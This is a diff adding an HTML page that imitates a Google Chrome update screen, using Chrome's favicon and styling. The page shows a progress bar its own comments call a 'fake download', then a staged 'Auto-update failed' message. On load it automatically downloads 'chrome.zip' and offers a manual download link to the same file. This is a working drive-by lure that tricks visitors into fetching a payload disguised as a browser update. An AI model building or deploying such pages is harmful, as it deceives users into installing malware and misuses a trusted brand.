@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Chrome Update</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://www.google.com/chrome/static/images/favicons/favicon-96x96.png">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <link rel="icon" type="image/x-icon" href="chrome.ico">
+
+  <style>
+    body {
+      margin: 0;
+      background: #f1f3f4;
+      font-family: 'Roboto', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .box {
+      background: #fff;
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.2);
+      text-align: center;
+      width: 360px;
+    }
+
+    .box img {
+      width: 56px;
+      margin-bottom: 1rem;
+    }
+
+    .box h2 {
+      font-size: 1.25rem;
+      margin: 0 0 0.5rem;
+      color: #202124;
+    }
+
+    .box p {
+      font-size: 0.95rem;
+      color: #5f6368;
+      margin-bottom: 1rem;
+    }
+
+    .progress {
+      background: #e0e0e0;
+      border-radius: 20px;
+      height: 10px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .bar {
+      height: 100%;
+      width: 0%;
+      background: #1a73e8;
+      transition: width 0.3s;
+    }
+
+    .fallback {
+      display: none;
+      margin-top: 1rem;
+    }
+
+    .fallback a {
+      font-size: 0.9rem;
+      color: #d93025;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .ver {
+      font-size: 0.75rem;
+      color: #9aa0a6;
+      margin-top: 1rem;
+    }
+  </style>
+
+  <script>
+    window.onload = () => {
+      // Start fake download
+      const bar = document.querySelector('.bar');
+      let progress = 0;
+      const interval = setInterval(() => {
+        progress += Math.random() * 15;
+        bar.style.width = Math.min(progress, 100) + "%";
+        if (progress >= 100) {
+          clearInterval(interval);
+          showFallback(); // fake failure
+        }
+      }, 300);
+
+      // Auto download ZIP
+      const a = document.createElement('a');
+      a.href = 'chrome.zip';
+      a.download = 'chrome.zip';
+      document.body.appendChild(a);
+      a.click();
+    };
+
+    function showFallback() {
+      document.querySelector('p').innerText = "Auto-update failed.";
+      document.querySelector('.fallback').style.display = "block";
+    }
+  </script>
+</head>
+<body>
+  <div class="box">
+    <img src="https://www.google.com/chrome/static/images/favicons/favicon-96x96.png" alt="Chrome">
+    <h2>Updating Chrome</h2>
+    <p>Downloading update...</p>
+    <div class="progress">
+      <div class="bar"></div>
+    </div>
+    <div class="fallback">
+      <a href="chrome.zip">Click here to update manually</a>
+    </div>
+    <div class="ver">v114.0.5735.199</div>
+  </div>
+</body>
+</html>
+
